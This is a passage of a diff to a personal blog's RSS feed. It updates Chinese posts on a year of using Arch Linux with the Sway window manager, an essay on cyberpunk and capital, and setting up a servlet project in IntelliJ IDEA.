-期末考试结束后，我听说了Arch Linux 的大名，但是出于畏难情绪，我选择将ubuntu18.04安装在我的thinkpad t480上，然后去参加xman的夏令营。在夏令营期间，我的电脑在连接wifi一段时间后就再也连接不上了，第一次我选择了重装，但是第二次还是同样的问题，我只好绝望地回到windows10，事后分析的时候，我觉得应该是驱动的问题，thinkpad t480是2018年下半年发布的，ubuntu18.04的驱动可能确实没覆盖到它的网卡。
-之后的好几个月里，我都乖乖用着windows10和WSL2，实习的时候全程在虚拟机里面写代码。等到实习结束、保研也结束的时候，我又开始了新一轮的折腾。
-2020年下半年，我将自己的主力电脑全面迁移到了Manjaro Linux下，那个时候qv2ray还很活跃，我的科学上网也很依赖它，但是有好几次在更新的时候发生了Manjaro特有的问题：软件的版本更新上来了，但是软件的依赖没有更新上来，这种问题也影响了trilium等软件，虽然不能怪manjaro，但是我还是愤而转向了Arch Linux，一直到今天我也还在用。
-转到Arch Linux之后，我基本上不再改变自己的发行版了，只是会在图形界面折腾一些。2020年-2021年上半年我使用的都是KDE，好看是真好看，但是Bug也是真的致命，这其中我亲身经历过的至少三次重复出现在不同电脑（thinkpad T480出现过，thinkbook 14p 出现过）的bug就是盒盖睡眠失败，我不知道是谁引起的，是plasma还是conky还是别的什么组件，我不知道，我在日志里也查不到。别看这个问题好像没什么，但是作为一个笔记本用户，盒盖后放进包里是一个非常自然的行为，回到宿舍没有第一时间拿出电脑而是休息一会也是很正常的行为，但是休息完后发现自己的电脑在包里变成了一个铁板烧就不是一个正常的现象了。嘴硬的人当然会说thinkpad不是有指示灯吗？你看指示灯判断是否睡眠成功不就行了？且不说我后来的电脑thinkbook 14p是没有指示灯的，单就系统质量而言，一个系统每次使用的时候都需要用户小心翼翼盯着指示灯看，是否已经说明了这是一个糟糕的系统了？为什么换成thinkbook？就是因为这个bug把我的thinkpad的主板烧坏了！我曾以为这是thinkpad独有的问题，可是当thinkbook也发生同样问题的时候我对KDE彻底失望了，是的，这是一个很漂亮的桌面环境，定制性强又有很多特效，可是这一切都建立在一些不稳定的bug上的时候，这些特效会更多扮演起bug的导火索角色。
-经历过KDE的bug后，我对复杂的桌面环境产生了恐惧，他们就像是一枚不定时炸弹。在这个前提背景下，我接触并开始使用SwayWM，一直到今天，我也还在使用，而那个致命Bug，已经离我远去。
-体验 得益于Arch Linux庞大的用户群，Arch 的软件包生态在一众发行版中可以说是称王称霸了，我举一个例子，你能想象在Linux的软件仓库中会出现deepin-wine魔改后的腾讯系软件吗？
-每次看到其他发行版用户手动下载deb然后安装的时候，我都会产生一种他们是不是在用windows的错觉，并不是看不起别的发行版，只是各有分工和侧重点，比如Arch的定位是桌面端用户，而很多别的发行版的定位是服务器，我不会用别的发行版当作我的桌面系统，就像我不会把Arch装在服务器上一样。用统一的包管理器管理软件包肯定是有好处的，能够大大减轻用户的心智负担。
-至于网络上提到的Arch Linux不稳定、容易滚挂的问题，不好意思，我用了两年Arch了，每天都执行yay -Syyu，从来没有出现滚挂的问题，相反，我目前所遇到的半数Linux相关问题，都是因为系统软件或者依赖库过于老旧而导致的，更新后就可以解决。Linux不是Windows，如果你不想要更新，那么有两种选择，第一种，锁定自己的软件版本，然后在每次安装新软件的时候单独解决依赖问题；第二种，回去用windows。
-说完了Arch Linux，再来说说Sway，这是一个简单的wayland窗口管理器，为什么用wayland，因为我不希望自己的图形界面建立在一个老旧而难以维护的基础设施之上，那给我的感觉就好像我在使用另一个plasma。诚然，wayland还有很长的一段路要走，很多桌面软件都不得不借助xwayland才能在其上运行，经过实际使用，除了在4k屏幕上xwayland有问题之外，其他情况下还是可以完美工作的。当然，部分软件是有问题的，比如腾讯会议的桌面共享功能，但是也已经有了曲线救国的办法，所以现在wayland的生态已经比之前要好一些了，当我看到linux qq内测群里有人提出wayland下的问题以及要求兼容wayland的时候，我就相信未来还会更好。
-Sway是一个窗口管理器，开发者做的事情是在wayland下复刻一个i3wm出来。窗口管理器的好处是我现在更多依赖键盘而不是鼠标了，可以减少对视觉聚焦于鼠标这种行为的依赖，转而更多依赖自己的触觉，另外，更少的特效和更简洁的设计不仅让我的系统大大增强了稳定性（据一位用KDE的同学说，直到今天，用KDE只要一周不关机就必定会崩溃），还让我自己更加专注于手头的工作（平铺式窗口管理器的统一好处）。不好的地方当然也有不少，比如初次接触的时候要花很多时间去配置和适应，比如每次修改操作键位的时候都需要一定时间去重新适应，比如fcitx5在某些软件下面无法工作或者是有缺陷（这不是fcitx5的锅），比如它让我认识到自己是一个很笨蛋的人，使用了一年了，让我时不时就发现自己的操作习惯可以有优化空间，比如：
-在按win+数字键的时候，用大拇指去按是很扭曲的姿势，**一个更加自然的姿势是用左手的掌心左下（手背视角）的部分去压win键，然后用手指去按数字键。**如果要按ctrl+win，就用同样的部位压住两个键，这个难度会大一些，大概确实还可以优化的。 调整窗口大小的时候，进入resize模式然后用键盘去按是很低效的行为，相反，这种时候依赖鼠标不是什么坏事，通过把鼠标悬停在窗口上然后按住右键进行拖拽就可以实现快速的窗口大小调整。 scratchpad中更适合使用tab模式。 有的时候在两个workspace之间切换会很频繁，这个时候更适合用workspace back_and_forth而不是一直执着于用数字键去切换，或者使用鼠标的滚轮来切换，这也是一个不错的主意。 除此之外还有一个小的优点，在sway下可以给不同键盘换上不同的布局，这点对我而言是刚需，但是在xorg下面，这种操作往往只能将同一个布局应用于所有的键盘，一旦布局出现了问题导致键盘不可用，那么所有的键盘都会变得不可用。
-最后，我和大部分的geek用户不一样，我比较笨，只是一个普通用户，我做不到也不想去和他们一样视鼠标如洪水猛兽，相反，sway下我还是会频繁使用鼠标，对我来说用鼠标去交互两个窗口的位置依旧是比用键盘更加高效的操作。所以我想说的是，追求属于自己的实用性，你可以去参考别人的建议，但是最终还是要找到属于你自己的习惯。 对于我个人来说， 我也完全不排除在plasma的bug修复后回到plasma的可能性，毕竟老牌桌面。
-列出我使用的软件：
-桌面环境 SwayWM（窗口管理） waybar（信息展示栏） 终端 alacritty 浏览器 firefox-developer-edition （主力） chrome 输入法 fcitx5 代码编辑 Neovim（主力） Vscode（副手） Jetbrains 做笔记 Neovim-qt zotero 文件浏览器 ranger dolphin 看论文 zotero okular 游戏 steam（泰拉瑞亚、黑暗之魂……） waydroid（明日方舟） HMCL（minecraft） 工具替代 exa 替代 ls zoxide 替代 cd scp 替代 cp Trouble Shooting 关机的时候出现 a stoping job is running for xxx hangout 修改/etc/systemd/system.</description>
+      <description>&lt;p&gt;不知不觉使用sway已经整整一年了，于是来谈一谈自己这一年的使用感受，顺便回顾了一下过去。&lt;/p&gt;
+&lt;h2 id=&#34;起因&#34;&gt;起因&lt;/h2&gt;
+&lt;p&gt;2019年，在一次编程作业的时候，同专业的另一个老哥向我展示了vim的代码h补全，我立刻被这种简陋但是扩展性极强的代码编辑器吸引了，于是当时还是个刚转入计算机专业的小白就开始哼哧哼哧地学习vim的配置和插件的安装。当然，这些都发生在我的Kali Linux虚拟机中。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20221217104938577.png&#34; alt=&#34;image-20221217104938577&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;那个时候我正接触CTF，很多时候都要开着虚拟机，于是有一天动起了把电脑系统直接装成linux的想法。因为自己的第一台笔记本是暗夜精灵2，游戏本装Linux，第一个要考虑的就是兼容性和稳定性，在权衡各个发行版的优势和流行程度后，我选择了ubuntu18.04。笔记本重装完毕后除了风扇转个不停竟然一切运行正常，这让我实在有些惊喜，而风扇问题是英伟达独显导致的，在ubuntu上，只需要一条&lt;code&gt;sudo ubuntu-drivers autoinstall&lt;/code&gt;就完美解决了。当时的自己很开心，仿佛打开了一道新世界的大门。&lt;/p&gt;
+&lt;p&gt;后来，我去吉林参加了第一次线下赛，ubuntu没有掉链子，帮我拿了一个一血，我很满意。直到一次上课，手贱执行了&lt;code&gt;apt upgrade&lt;/code&gt;，升级完电脑竟然无法开机了，一整个无语，而当时临近期末，我已经没有时间再去折腾系统了，于是紧急安装了windows应付期末复习，顺便下单了一台对Linux更加友好的笔记本Thinkpad T480。&lt;/p&gt;
+&lt;p&gt;期末考试结束后，我听说了Arch Linux 的大名，但是出于畏难情绪，我选择将ubuntu18.04安装在我的thinkpad t480上，然后去参加xman的夏令营。在夏令营期间，我的电脑在连接wifi一段时间后就再也连接不上了，第一次我选择了重装，但是第二次还是同样的问题，我只好绝望地回到windows10，事后分析的时候，我觉得应该是驱动的问题，thinkpad t480是2018年下半年发布的，ubuntu18.04的驱动可能确实没覆盖到它的网卡。&lt;/p&gt;
+&lt;p&gt;之后的好几个月里，我都乖乖用着windows10和WSL2，实习的时候全程在虚拟机里面写代码。等到实习结束、保研也结束的时候，我又开始了新一轮的折腾。&lt;/p&gt;
+&lt;p&gt;2020年下半年，我将自己的主力电脑全面迁移到了Manjaro Linux下，那个时候qv2ray还很活跃，我的科学上网也很依赖它，但是有好几次在更新的时候发生了Manjaro特有的问题：软件的版本更新上来了，但是软件的依赖没有更新上来，这种问题也影响了trilium等软件，虽然不能怪manjaro，但是我还是愤而转向了Arch Linux，一直到今天我也还在用。&lt;/p&gt;
+&lt;p&gt;转到Arch Linux之后，我基本上不再改变自己的发行版了，只是会在图形界面折腾一些。2020年-2021年上半年我使用的都是KDE，好看是真好看，但是Bug也是真的致命，这其中我亲身经历过的至少三次重复出现在不同电脑（thinkpad T480出现过，thinkbook 14p 出现过）的bug就是盒盖睡眠失败，我不知道是谁引起的，是plasma还是conky还是别的什么组件，我不知道，我在日志里也查不到。别看这个问题好像没什么，但是作为一个笔记本用户，盒盖后放进包里是一个非常自然的行为，回到宿舍没有第一时间拿出电脑而是休息一会也是很正常的行为，但是休息完后发现自己的电脑在包里变成了一个铁板烧就不是一个正常的现象了。嘴硬的人当然会说thinkpad不是有指示灯吗？你看指示灯判断是否睡眠成功不就行了？且不说我后来的电脑thinkbook 14p是没有指示灯的，单就系统质量而言，一个系统每次使用的时候都需要用户小心翼翼盯着指示灯看，是否已经说明了这是一个糟糕的系统了？为什么换成thinkbook？就是因为这个bug把我的thinkpad的主板烧坏了！我曾以为这是thinkpad独有的问题，可是当thinkbook也发生同样问题的时候我对KDE彻底失望了，是的，这是一个很漂亮的桌面环境，定制性强又有很多特效，可是这一切都建立在一些不稳定的bug上的时候，这些特效会更多扮演起bug的导火索角色。&lt;/p&gt;
+&lt;p&gt;经历过KDE的bug后，我对复杂的桌面环境产生了恐惧，他们就像是一枚不定时炸弹。在这个前提背景下，我接触并开始使用SwayWM，一直到今天，我也还在使用，而那个致命Bug，已经离我远去。&lt;/p&gt;
+&lt;h2 id=&#34;体验&#34;&gt;体验&lt;/h2&gt;
+&lt;p&gt;得益于Arch Linux庞大的用户群，Arch 的软件包生态在一众发行版中可以说是称王称霸了，我举一个例子，你能想象在Linux的软件仓库中会出现deepin-wine魔改后的腾讯系软件吗？&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20221217115944914.png&#34; alt=&#34;image-20221217115944914&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;每次看到其他发行版用户手动下载deb然后安装的时候，我都会产生一种他们是不是在用windows的错觉，并不是看不起别的发行版，只是各有分工和侧重点，比如Arch的定位是桌面端用户，而很多别的发行版的定位是服务器，我不会用别的发行版当作我的桌面系统，就像我不会把Arch装在服务器上一样。用统一的包管理器管理软件包肯定是有好处的，能够大大减轻用户的心智负担。&lt;/p&gt;
+&lt;p&gt;至于网络上提到的Arch Linux不稳定、容易滚挂的问题，不好意思，我用了两年Arch了，每天都执行&lt;code&gt;yay -Syyu&lt;/code&gt;，从来没有出现滚挂的问题，相反，我目前所遇到的半数Linux相关问题，都是因为系统软件或者依赖库过于老旧而导致的，更新后就可以解决。Linux不是Windows，如果你不想要更新，那么有两种选择，第一种，锁定自己的软件版本，然后在每次安装新软件的时候单独解决依赖问题；第二种，回去用windows。&lt;/p&gt;
+&lt;p&gt;说完了Arch Linux，再来说说Sway，这是一个简单的wayland窗口管理器，为什么用wayland，因为我不希望自己的图形界面建立在一个老旧而难以维护的基础设施之上，那给我的感觉就好像我在使用另一个plasma。诚然，wayland还有很长的一段路要走，很多桌面软件都不得不借助xwayland才能在其上运行，经过实际使用，除了在4k屏幕上xwayland有问题之外，其他情况下还是可以完美工作的。当然，部分软件是有问题的，比如腾讯会议的桌面共享功能，但是也已经有了曲线救国的办法，所以现在wayland的生态已经比之前要好一些了，当我看到linux qq内测群里有人提出wayland下的问题以及要求兼容wayland的时候，我就相信未来还会更好。&lt;/p&gt;
+&lt;p&gt;Sway是一个窗口管理器，开发者做的事情是在wayland下复刻一个i3wm出来。窗口管理器的好处是我现在更多依赖键盘而不是鼠标了，可以减少对视觉聚焦于鼠标这种行为的依赖，转而更多依赖自己的触觉，另外，更少的特效和更简洁的设计不仅让我的系统大大增强了稳定性（据一位用KDE的同学说，直到今天，用KDE只要一周不关机就必定会崩溃），还让我自己更加专注于手头的工作（平铺式窗口管理器的统一好处）。不好的地方当然也有不少，比如初次接触的时候要花很多时间去配置和适应，比如每次修改操作键位的时候都需要一定时间去重新适应，比如fcitx5在某些软件下面无法工作或者是有缺陷（这不是fcitx5的锅），比如它让我认识到自己是一个很笨蛋的人，使用了一年了，让我时不时就发现自己的操作习惯可以有优化空间，比如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在按win+数字键的时候，用大拇指去按是很扭曲的姿势，**一个更加自然的姿势是用左手的掌心左下（手背视角）的部分去压win键，然后用手指去按数字键。**如果要按ctrl+win，就用同样的部位压住两个键，这个难度会大一些，大概确实还可以优化的。&lt;/li&gt;
+&lt;li&gt;调整窗口大小的时候，进入resize模式然后用键盘去按是很低效的行为，相反，这种时候依赖鼠标不是什么坏事，通过把鼠标悬停在窗口上然后按住右键进行拖拽就可以实现快速的窗口大小调整。&lt;/li&gt;
+&lt;li&gt;scratchpad中更适合使用tab模式。&lt;/li&gt;
+&lt;li&gt;有的时候在两个workspace之间切换会很频繁，这个时候更适合用&lt;code&gt;workspace back_and_forth&lt;/code&gt;而不是一直执着于用数字键去切换，或者使用鼠标的滚轮来切换，这也是一个不错的主意。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;除此之外还有一个小的优点，在sway下可以给不同键盘换上不同的布局，这点对我而言是刚需，但是在xorg下面，这种操作往往只能将同一个布局应用于所有的键盘，一旦布局出现了问题导致键盘不可用，那么所有的键盘都会变得不可用。&lt;/p&gt;
+&lt;p&gt;最后，我和大部分的geek用户不一样，我比较笨，只是一个普通用户，我做不到也不想去和他们一样视鼠标如洪水猛兽，相反，sway下我还是会频繁使用鼠标，对我来说用鼠标去交互两个窗口的位置依旧是比用键盘更加高效的操作。&lt;strong&gt;所以我想说的是，追求属于自己的实用性，你可以去参考别人的建议，但是最终还是要找到属于你自己的习惯。&lt;/strong&gt; 对于我个人来说， 我也完全不排除在plasma的bug修复后回到plasma的可能性，毕竟老牌桌面。&lt;/p&gt;
+&lt;p&gt;列出我使用的软件：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;桌面环境
+&lt;ul&gt;
+&lt;li&gt;SwayWM（窗口管理）&lt;/li&gt;
+&lt;li&gt;waybar（信息展示栏）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;终端
+&lt;ul&gt;
+&lt;li&gt;alacritty&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;浏览器
+&lt;ul&gt;
+&lt;li&gt;firefox-developer-edition （主力）&lt;/li&gt;
+&lt;li&gt;chrome&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;输入法
+&lt;ul&gt;
+&lt;li&gt;fcitx5&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;代码编辑
+&lt;ul&gt;
+&lt;li&gt;Neovim（主力）&lt;/li&gt;
+&lt;li&gt;Vscode（副手）&lt;/li&gt;
+&lt;li&gt;Jetbrains&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;做笔记
+&lt;ul&gt;
+&lt;li&gt;Neovim-qt&lt;/li&gt;
+&lt;li&gt;zotero&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;文件浏览器
+&lt;ul&gt;
+&lt;li&gt;ranger&lt;/li&gt;
+&lt;li&gt;dolphin&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;看论文
+&lt;ul&gt;
+&lt;li&gt;zotero&lt;/li&gt;
+&lt;li&gt;okular&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;游戏
+&lt;ul&gt;
+&lt;li&gt;steam（泰拉瑞亚、黑暗之魂……）&lt;/li&gt;
+&lt;li&gt;waydroid（明日方舟）&lt;/li&gt;
+&lt;li&gt;HMCL（minecraft）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;工具替代
+&lt;ul&gt;
+&lt;li&gt;exa 替代 ls&lt;/li&gt;
+&lt;li&gt;zoxide 替代 cd&lt;/li&gt;
+&lt;li&gt;scp 替代 cp&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;trouble-shooting&#34;&gt;Trouble Shooting&lt;/h2&gt;
+&lt;h3 id=&#34;关机的时候出现-a-stoping-job-is-running-for-xxx-hangout&#34;&gt;关机的时候出现 a stoping job is running for xxx hangout&lt;/h3&gt;
+&lt;p&gt;修改&lt;code&gt;/etc/systemd/system.conf&lt;/code&gt;&lt;/p&gt;</description>
     </item>
     <item>
       <title>vim/neovim 的问题</title>
@@ -336,17 +539,25 @@ Sway是一个窗口管理器，开发者做的事情是在wayland下复刻一个
       <link>https://ch3n9w.github.io/posts/gossip-cyberpunk/</link>
       <pubDate>Fri, 19 Nov 2021 11:18:11 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/gossip-cyberpunk/</guid>
-      <description>科技的发展并不代表内卷的避免,相反,一味追求在虚拟世界中开疆拓土,忽视宇宙和深海的探索开发正是人类社会内卷化的集中反映,此处的内卷,和通常的内卷定义相同,即&amp;quot;一类文化模式达到了某种最终的形态以后,既没有办法稳定下来,也没有办法转变为新的形态.而只能不断地在内部变得更加复杂的现象&amp;quot;,只不过对象从普通的小群体变成了全体人类,社会矛盾的频繁爆发让人类倾向于将自己的灵与肉奉献给虚拟的神,这种奉献的热诚背后充斥着对冰冷现实的无力感和逃避,即便这种虚拟是人类自己创造出来的,他们依旧选择忽视甚至忘却这种自知,选择被奴役,膜拜和瞻仰.
-另外一方面,正如洛夫克拉夫特所说的&amp;quot;人类最古老又最强烈的情绪,就是恐惧;而最古老又最强烈的恐惧,是对未知的恐惧&amp;quot;,在刻录在基因中的人性的驱使下,人类在总体层面上对未知的深海和太空是恐惧的,可是,要让人类接受自己社会发展停滞不前的事实,又是可耻且无法接受的.在这种背景下,虚拟世界的扩张从另一个角度为全体人类提供了一个&amp;quot;发展&amp;quot;的幻象,使得人类可以将蒙蔽双眼,逃脱生存困境,将注意力集中在已有事物的&amp;quot;发展&amp;quot;上,即便是内卷式的发展.
-从理性的角度来说,人类文明要想长存不休,必须要将触角极力扩张到太空和海洋当中,然而人类总体上呈现的是一种非理性的意识形态,这并不新奇,在上帝已死的年代里,人类相信的不再是神明而是科技和资本,而科技为资本所掌控,所以资本的信仰便是人类的信仰,乍看之下,资本代表着贪婪和逐利,并且具备一定程度上的理性,但可惜的是,正是这种信仰将虚拟世界捧上神坛并加剧了社会的内卷化,而这种情况很难发生改变,理由如下:
-资本并不具备引领人类社会向好发展的动机,资本行动的唯一动机是为自身逐利
-资本理性的主体在&amp;quot;自己的寿命是有限的&amp;quot;这样一个前提下,会自发选择在&amp;quot;当下&amp;quot;时间点获利最大的发展方向
-当资本在一个领域中能或即将获取足够多利润,或者发现切换别的领域所付出的代价远大于自己所失去的时候,它将调用舆论吸引人类的注意力以期更大的利润空间
-人类是盲从且愚昧的,尤其是在被消费社会阉割批判能力后基本上已经丧失了真正的自由意志,成为资本的牵线木偶.
-一个额外的发现是,如果将上述三个理由作为评判资本能力的标准,就会发现腾讯阿里巴巴等不靠科技驱动的公司才是资本意义上能力最强的公司,我担心这种内卷式的崛起会提醒其他资本,最大化的利润完全不需要科技创新,只需要靠&amp;quot;内卷&amp;quot;就可以了.或许,他们已经意识到了?
-其实很久以前就有人预测到了如今的现状,那就是赛伯朋克,它想告诉人们,科技的畸形发展不能解决而会加剧社会矛盾和人类的焦虑,可遗憾的是,在资本的操纵下,这种畸形的科技被繁复炫目的光影包装成了一种美学象征,这种人类的焦虑被刻意淡化甚至抹去,转而重新变成一种商品,一种无论是在商业意义还是精神意义上对资本力量更加有利的商品&amp;ndash;既谋取了利润,又扭曲了对抗虚拟的文学,这出&amp;quot;化敌为友&amp;quot;实在高明至极.
-赛博朋克指出了科技畸形发展所产生的问题,警告人们这样做的后果,但是很可惜,我们已经停不下来了,看起来,我们势必迈入赛伯朋克式的未来社会中,步履坚定,热切真诚.而到了那个时候,或者在那之前,也许更有价值的问题是:我们如何走出赛伯朋克?
-话说回来,在赛博朋克被提出的那个年代,根本没有人们如今看到的虚拟世界的哪怕一丝影子,我所能想到的,是这些科幻作家们凭借自身少得可怜的科技水平和对人性的充分了解所做出的猜测和臆想,或许他们创作的动机中,根本不包括一丝严肃批判的思考,而只是为了博人眼球来多赚点稿费罢了,但总之,他们猜中了,并且猜得更加超前.或许科技的发展史,就是一副肖像画,画的主题叫做人性.</description>
+      <description>&lt;p&gt;科技的发展并不代表内卷的避免,相反,一味追求在虚拟世界中开疆拓土,忽视宇宙和深海的探索开发正是人类社会内卷化的集中反映,此处的内卷,和通常的内卷定义相同,即&amp;quot;一类文化模式达到了某种最终的形态以后,既没有办法稳定下来,也没有办法转变为新的形态.而只能不断地在内部变得更加复杂的现象&amp;quot;,只不过对象从普通的小群体变成了全体人类,社会矛盾的频繁爆发让人类倾向于将自己的灵与肉奉献给虚拟的神,这种奉献的热诚背后充斥着对冰冷现实的无力感和逃避,即便这种虚拟是人类自己创造出来的,他们依旧选择忽视甚至忘却这种自知,选择被奴役,膜拜和瞻仰.&lt;/p&gt;
+&lt;p&gt;另外一方面,正如洛夫克拉夫特所说的&amp;quot;人类最古老又最强烈的情绪,就是恐惧;而最古老又最强烈的恐惧,是对未知的恐惧&amp;quot;,在刻录在基因中的人性的驱使下,人类在总体层面上对未知的深海和太空是恐惧的,可是,要让人类接受自己社会发展停滞不前的事实,又是可耻且无法接受的.在这种背景下,虚拟世界的扩张从另一个角度为全体人类提供了一个&amp;quot;发展&amp;quot;的幻象,使得人类可以将蒙蔽双眼,逃脱生存困境,将注意力集中在已有事物的&amp;quot;发展&amp;quot;上,即便是内卷式的发展.&lt;/p&gt;
+&lt;p&gt;从理性的角度来说,人类文明要想长存不休,必须要将触角极力扩张到太空和海洋当中,然而人类总体上呈现的是一种非理性的意识形态,这并不新奇,在上帝已死的年代里,人类相信的不再是神明而是科技和资本,而科技为资本所掌控,所以资本的信仰便是人类的信仰,乍看之下,资本代表着贪婪和逐利,并且具备一定程度上的理性,但可惜的是,正是这种信仰将虚拟世界捧上神坛并加剧了社会的内卷化,而这种情况很难发生改变,理由如下:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;资本并不具备引领人类社会向好发展的动机,资本行动的唯一动机是为自身逐利&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;资本理性的主体在&amp;quot;自己的寿命是有限的&amp;quot;这样一个前提下,会自发选择在&amp;quot;当下&amp;quot;时间点获利最大的发展方向&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当资本在一个领域中能或即将获取足够多利润,或者发现切换别的领域所付出的代价远大于自己所失去的时候,它将调用舆论吸引人类的注意力以期更大的利润空间&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;人类是盲从且愚昧的,尤其是在被消费社会阉割批判能力后基本上已经丧失了真正的自由意志,成为资本的牵线木偶.&lt;/p&gt;
+&lt;p&gt;一个额外的发现是,如果将上述三个理由作为评判资本能力的标准,就会发现腾讯阿里巴巴等不靠科技驱动的公司才是资本意义上能力最强的公司,我担心这种内卷式的崛起会提醒其他资本,最大化的利润完全不需要科技创新,只需要靠&amp;quot;内卷&amp;quot;就可以了.或许,他们已经意识到了?&lt;/p&gt;
+&lt;p&gt;其实很久以前就有人预测到了如今的现状,那就是赛伯朋克,它想告诉人们,科技的畸形发展不能解决而会加剧社会矛盾和人类的焦虑,可遗憾的是,在资本的操纵下,这种畸形的科技被繁复炫目的光影包装成了一种美学象征,这种人类的焦虑被刻意淡化甚至抹去,转而重新变成一种商品,一种无论是在商业意义还是精神意义上对资本力量更加有利的商品&amp;ndash;既谋取了利润,又扭曲了对抗虚拟的文学,这出&amp;quot;化敌为友&amp;quot;实在高明至极.&lt;/p&gt;
+&lt;p&gt;赛博朋克指出了科技畸形发展所产生的问题,警告人们这样做的后果,但是很可惜,我们已经停不下来了,看起来,我们势必迈入赛伯朋克式的未来社会中,步履坚定,热切真诚.而到了那个时候,或者在那之前,也许更有价值的问题是:我们如何走出赛伯朋克?&lt;/p&gt;
+&lt;p&gt;话说回来,在赛博朋克被提出的那个年代,根本没有人们如今看到的虚拟世界的哪怕一丝影子,我所能想到的,是这些科幻作家们凭借自身少得可怜的科技水平和对人性的充分了解所做出的猜测和臆想,或许他们创作的动机中,根本不包括一丝严肃批判的思考,而只是为了博人眼球来多赚点稿费罢了,但总之,他们猜中了,并且猜得更加超前.或许科技的发展史,就是一副肖像画,画的主题叫做人性.&lt;/p&gt;</description>
     </item>
     <item>
       <title>GhostCat(CVE-2020-1938)漏洞学习</title>
@@ -371,18 +582,30 @@ Sway是一个窗口管理器，开发者做的事情是在wayland下复刻一个
       <link>https://ch3n9w.github.io/posts/tech-idea-start-servlet/</link>
       <pubDate>Thu, 01 Oct 2020 22:10:28 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/tech-idea-start-servlet/</guid>
-      <description>采用的是版本较新的idea2020.2, 使用的操作系统为MANJARO LINUX, 其中的过程挺迷迷糊糊的就水一篇来记录一下.
-File --&amp;gt; New --&amp;gt; Project --&amp;gt; Java --&amp;gt; Nextnext 新建一个项目 右键Project --&amp;gt; open module setting --&amp;gt; 点击+号 --&amp;gt; 导入tomcat8的Servlet-api.jar 右键项目 --&amp;gt; Add Frameworks Support --&amp;gt; 选中web application 选中后会多出来几个东西, 如下图, 多了WEB-INF目录和index.jsp
-Web-INF里面有只有一个web.xml, 什么是WEB-INF? 根据百度百科的介绍
-WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。
-WEB-INF文件夹下除了web.xml外，还存一个classes文件夹，用以放置 *.class文件，这些 *.class文件是网站设计人员编写的类库，实现了jsp页面前台美工与后台服务的分离，使得网站的维护非常方便。web.xml文件为网站部署描述XML文件，对网站的部署非常重要。
-Web-Inf文件夹中除了有classes文件夹和一个web.xml文件外、还有lib文件夹（用于存放需要的jar包）（用于配置，比如说用来配置过滤器等。）
-/WEB-INF/src/ 源码目录，按照包名结构放置各个java文件。
-/WEB-INF/database.properties 数据库配置文件
-/WEB-INF/tags/
-存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：&amp;lt;%@ taglibprefix=&amp;ldquo;tags&amp;rdquo; tagdir=&amp;quot;/WEB-INF /simpleTags&amp;quot; % &amp;gt;。
-/WEB-INF/jsp/
-jsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 。</description>
+      <description>&lt;p&gt;采用的是版本较新的idea2020.2, 使用的操作系统为&lt;code&gt;MANJARO LINUX&lt;/code&gt;, 其中的过程挺迷迷糊糊的就水一篇来记录一下.&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;File --&amp;gt; New --&amp;gt; Project --&amp;gt; Java --&amp;gt; Nextnext 新建一个项目
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;右键Project --&amp;gt; open module setting --&amp;gt; 点击+号 --&amp;gt; 导入tomcat8的Servlet-api.jar 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20211114141517710.png&#34; alt=&#34;image-20211114141517710&#34;  /&gt;
+&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;右键项目 --&amp;gt; Add Frameworks Support --&amp;gt; 选中web application
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20211114141525898.png&#34; alt=&#34;image-20211114141525898&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;选中后会多出来几个东西, 如下图, 多了&lt;code&gt;WEB-INF&lt;/code&gt;目录和&lt;code&gt;index.jsp&lt;/code&gt;&lt;/p&gt;
